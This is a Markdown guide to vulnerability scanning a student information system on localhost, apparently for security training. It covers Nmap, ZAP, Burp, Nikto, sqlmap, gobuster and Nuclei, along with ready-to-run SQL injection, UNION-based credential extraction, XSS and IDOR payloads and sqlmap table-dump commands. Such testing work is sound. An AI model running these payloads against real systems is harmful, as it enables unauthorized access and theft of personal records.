# Vulnerability Scanning Guide
## Tripati Group of Institutions - Student Information System

This guide explains how to perform vulnerability scanning on the application using various security tools.

---

## üîç 1. NMAP (Network Mapper)

### Basic Port Scanning

**Scan for open ports:**
```bash
nmap -sS -p- localhost
```

**Scan specific port (3000 - backend):**
```bash
nmap -sV -p 3000 localhost
```

**Scan for common vulnerabilities:**
```bash
nmap --script vuln localhost -p 3000
```

**Detailed service detection:**
```bash
nmap -sV -sC -p 3000 localhost
```

**Scan for SQL injection vulnerabilities:**
```bash
nmap --script http-sql-injection localhost -p 3000
```

**Scan for XSS vulnerabilities:**
```bash
nmap --script http-xssed localhost -p 3000
```

**Comprehensive web application scan:**
```bash
nmap --script http-enum,http-methods,http-headers,http-auth,http-sql-injection,http-xssed -p 3000 localhost
```

### Useful Nmap Scripts for Web Apps:
```bash
# All HTTP scripts
nmap --script "http-*" localhost -p 3000

# Specific scripts
nmap --script http-enum,http-methods,http-headers,http-auth localhost -p 3000

# Security focused
nmap --script http-security-headers,http-csrf,http-sql-injection localhost -p 3000
```

---

## üîç 2. OWASP ZAP (Zed Attack Proxy)

### Installation:
```bash
# On Kali Linux
sudo apt-get install zaproxy

# Or download from: https://www.zaproxy.org/download/
```

### Automated Scan:
```bash
# Start ZAP in daemon mode
zap.sh -daemon -port 8080

# Run quick scan
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://localhost:3000

# Run full scan
zap-cli full-scan --self-contained --start-options '-config api.disablekey=true' http://localhost:3000
```

### Using ZAP GUI:
1. Start ZAP: `zap.sh`
2. Configure target: `http://localhost:3000`
3. Run **Quick Start** scan
4. Or use **Spider** to crawl the application
5. Run **Active Scan** for vulnerability testing
6. Review **Alerts** tab for findings

### ZAP API Scan:
```bash
# Start ZAP
zap.sh -daemon -port 8080 -config api.disablekey=true

# Spider scan
curl "http://localhost:8080/JSON/spider/action/scan/?url=http://localhost:3000"

# Active scan
curl "http://localhost:8080/JSON/ascan/action/scan/?url=http://localhost:3000"

# Get results
curl "http://localhost:8080/JSON/core/view/alerts/"
```

---

## üîç 3. BURP SUITE

### Setup:
1. Download Burp Suite Community Edition
2. Configure browser proxy: `127.0.0.1:8080`
3. Install Burp CA certificate in browser

### Scanning Steps:
1. **Proxy** - Intercept requests
2. **Spider** - Crawl the application
3. **Scanner** - Active vulnerability scanning
4. **Repeater** - Manual request manipulation
5. **Intruder** - Automated attack testing

### Manual Testing with Burp:
- Intercept login requests
- Modify parameters for SQL injection
- Test for IDOR by changing IDs
- Test XSS in input fields
- Analyze responses for information disclosure

---

## üîç 4. NIKTO (Web Server Scanner)

### Installation:
```bash
sudo apt-get install nikto
```

### Basic Scan:
```bash
nikto -h http://localhost:3000
```

### Advanced Options:
```bash
# Scan with specific port
nikto -h http://localhost:3000 -p 3000

# Scan with authentication
nikto -h http://localhost:3000 -id admin:admin123

# Scan specific paths
nikto -h http://localhost:3000 -C all -Tuning 1,2,3,4,5,6,7,8,9

# Output to file
nikto -h http://localhost:3000 -o nikto_results.html -Format htm
```

### Useful Nikto Options:
```bash
# Check for SQL injection
nikto -h http://localhost:3000 -Plugins "apacheusers,subdomain,robots"

# Comprehensive scan
nikto -h http://localhost:3000 -C all -Tuning 1-9
```

---

## üîç 5. SQLMAP (Automated SQL Injection)

### Installation:
```bash
sudo apt-get install sqlmap
# Or
pip install sqlmap
```

### Basic SQL Injection Test:
```bash
# Test login endpoint
sqlmap -u "http://localhost:3000/api/login" \
  --data="username=admin&password=test" \
  --method=POST \
  --batch \
  --dbs

# Test with cookies (if logged in)
sqlmap -u "http://localhost:3000/api/student/marks/STU001" \
  --cookie="token=YOUR_TOKEN" \
  --batch \
  --dbs
```

### Advanced SQLMap:
```bash
# Enumerate databases
sqlmap -u "http://localhost:3000/api/login" \
  --data="username=admin&password=test" \
  --method=POST \
  --dbs

# Enumerate tables
sqlmap -u "http://localhost:3000/api/login" \
  --data="username=admin&password=test" \
  --method=POST \
  -D students \
  --tables

# Dump specific table
sqlmap -u "http://localhost:3000/api/login" \
  --data="username=admin&password=test" \
  --method=POST \
  -D students \
  -T users \
  --dump

# Test specific parameter
sqlmap -u "http://localhost:3000/api/student/marks/STU001" \
  -p id \
  --batch \
  --dbs
```

### SQLMap with Request File:
```bash
# Save request to file (from Burp)
sqlmap -r request.txt --batch --dbs
```

---

## üîç 6. DIRB / DIRBUSTER / GOBUSTER (Directory Brute Forcing)

### DIRB:
```bash
dirb http://localhost:3000 /usr/share/wordlists/dirb/common.txt
```

### GOBUSTER:
```bash
# Install
go install github.com/OJ/gobuster/v3@latest

# Directory scan
gobuster dir -u http://localhost:3000 -w /usr/share/wordlists/dirb/common.txt

# API endpoint discovery
gobuster dir -u http://localhost:3000/api -w /usr/share/wordlists/dirb/common.txt -x .json,.js
```

### DIRBUSTER (GUI):
1. Launch DirBuster
2. Target URL: `http://localhost:3000`
3. Select wordlist
4. Start scan

---

## üîç 7. WFUZZ (Web Fuzzer)

### Installation:
```bash
sudo apt-get install wfuzz
```

### Basic Fuzzing:
```bash
# Fuzz API endpoints
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt http://localhost:3000/api/FUZZ

# Fuzz with POST data
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt \
  -d "username=FUZZ&password=test" \
  -X POST \
  http://localhost:3000/api/login

# Fuzz student IDs
wfuzz -c -z range,1-30 http://localhost:3000/api/student/attendance/STU00FUZZ
```

---

## üîç 8. NUCLEI (Fast Vulnerability Scanner)

### Installation:
```bash
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
```

### Basic Scan:
```bash
nuclei -u http://localhost:3000

# With specific templates
nuclei -u http://localhost:3000 -t /path/to/templates/

# SQL injection templates
nuclei -u http://localhost:3000 -t ~/nuclei-templates/sql-injection/

# XSS templates
nuclei -u http://localhost:3000 -t ~/nuclei-templates/xss/
```

---

## üîç 9. COMMAND LINE TOOLS

### cURL for Manual Testing:
```bash
# Test SQL injection
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1'\''--","password":"test"}'

# Test IDOR
curl http://localhost:3000/api/student/attendance/STU002

# Test XSS
curl -X POST http://localhost:3000/api/feedback \
  -H "Content-Type: application/json" \
  -d '{"student_id":"STU001","comment":"<script>alert(1)</script>","category":"test"}'
```

### HTTPie (Better cURL):
```bash
# Install
sudo apt-get install httpie

# Test endpoints
http POST localhost:3000/api/login username="admin' OR '1'='1'--" password=test
```

---

## üîç 10. SPECIALIZED WEB APP SCANNERS

### Wapiti:
```bash
sudo apt-get install wapiti
wapiti -u http://localhost:3000
```

### W3AF:
```bash
sudo apt-get install w3af
w3af_console
# Then use GUI or console commands
```

### Arachni:
```bash
sudo apt-get install arachni
arachni http://localhost:3000
```

---

## üîç 11. COMPREHENSIVE SCANNING WORKFLOW

### Step-by-Step Process:

#### 1. Reconnaissance
```bash
# Port scan
nmap -sV -p- localhost

# Service detection
nmap -sC -p 3000 localhost

# Directory enumeration
gobuster dir -u http://localhost:3000 -w /usr/share/wordlists/dirb/common.txt
```

#### 2. Automated Scanning
```bash
# OWASP ZAP
zap-cli quick-scan http://localhost:3000

# Nikto
nikto -h http://localhost:3000

# Nuclei
nuclei -u http://localhost:3000
```

#### 3. SQL Injection Testing
```bash
# SQLMap
sqlmap -u "http://localhost:3000/api/login" \
  --data="username=test&password=test" \
  --method=POST \
  --batch
```

#### 4. Manual Testing
- Use Burp Suite to intercept and modify requests
- Test each input field for vulnerabilities
- Verify automated findings

---

## üîç 12. SCANNING CHECKLIST

### Network Level:
- [ ] Port scanning with Nmap
- [ ] Service version detection
- [ ] SSL/TLS configuration (if HTTPS)
- [ ] Firewall rules

### Application Level:
- [ ] Directory/file enumeration
- [ ] API endpoint discovery
- [ ] Authentication bypass testing
- [ ] SQL injection scanning
- [ ] XSS scanning
- [ ] CSRF testing
- [ ] File upload testing
- [ ] IDOR testing
- [ ] Information disclosure
- [ ] Session management

### Automated Tools:
- [ ] OWASP ZAP scan
- [ ] Nikto scan
- [ ] SQLMap scan
- [ ] Nuclei scan
- [ ] Burp Suite active scan

---

## üîç 13. USEFUL COMMANDS FOR THIS APPLICATION

### Quick Nmap Scan:
```bash
nmap -sV -sC -p 3000 localhost --script http-enum,http-methods,http-headers
```

### API Endpoint Discovery:
```bash
# Using curl to test endpoints
curl http://localhost:3000/api
curl http://localhost:3000/api/students
curl http://localhost:3000/api/admin/users
```

### SQL Injection Test:
```bash
# Test login
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1'\''--","password":"anything"}'

# Test marks endpoint
curl "http://localhost:3000/api/student/marks/STU001' UNION SELECT username,password FROM users--"
```

### IDOR Test:
```bash
# Access other student's data
curl http://localhost:3000/api/student/attendance/STU002
curl http://localhost:3000/api/student/marks/STU003
curl http://localhost:3000/api/student/fees/STU004
```

---

## üîç 14. INTERPRETING RESULTS

### Nmap Results:
- **Open ports**: Services running
- **Service versions**: Potential version-specific vulnerabilities
- **Script results**: Specific vulnerability findings

### OWASP ZAP Results:
- **Alerts**: Categorized by risk (High, Medium, Low, Informational)
- **Active Scan**: Automated vulnerability detection
- **Spider**: Discovered URLs and endpoints

### SQLMap Results:
- **Vulnerable parameters**: Which inputs are injectable
- **Database information**: Extracted data
- **Payloads**: Successful injection strings

---

## üîç 15. TIPS FOR EFFECTIVE SCANNING

1. **Start with reconnaissance** - Understand the application structure
2. **Use multiple tools** - Each tool finds different issues
3. **Combine automated and manual** - Automated finds obvious issues, manual finds complex ones
4. **Document everything** - Keep notes of what you tested
5. **Verify findings** - Not all automated findings are real vulnerabilities
6. **Test in safe environment** - Always test on localhost/isolated systems

---

## üîç 16. TOOL COMPARISON

| Tool | Best For | Type |
|------|----------|------|
| **Nmap** | Port scanning, service detection | Network |
| **OWASP ZAP** | Web app vulnerabilities, automated scanning | Web App |
| **Burp Suite** | Manual testing, request manipulation | Web App |
| **Nikto** | Web server misconfigurations | Web Server |
| **SQLMap** | SQL injection exploitation | Database |
| **Nuclei** | Fast vulnerability detection | Web App |
| **Gobuster** | Directory/file enumeration | Web App |
| **WFuzz** | Parameter fuzzing | Web App |

---

## ‚ö†Ô∏è IMPORTANT NOTES

- **Only scan your own systems** or systems you have explicit permission to test
- **Some tools may be aggressive** - Use with caution
- **Rate limiting** - Some scans may trigger rate limits
- **False positives** - Always verify automated findings manually
- **Legal compliance** - Ensure you have authorization before scanning

---

## üìù QUICK START COMMANDS

```bash
# 1. Port scan
nmap -sV localhost -p 3000

# 2. Web server scan
nikto -h http://localhost:3000

# 3. Directory enumeration
gobuster dir -u http://localhost:3000 -w /usr/share/wordlists/dirb/common.txt

# 4. SQL injection test
sqlmap -u "http://localhost:3000/api/login" --data="username=test&password=test" --method=POST --batch

# 5. OWASP ZAP quick scan
zap-cli quick-scan http://localhost:3000
```

---

**Happy Scanning! üîç**

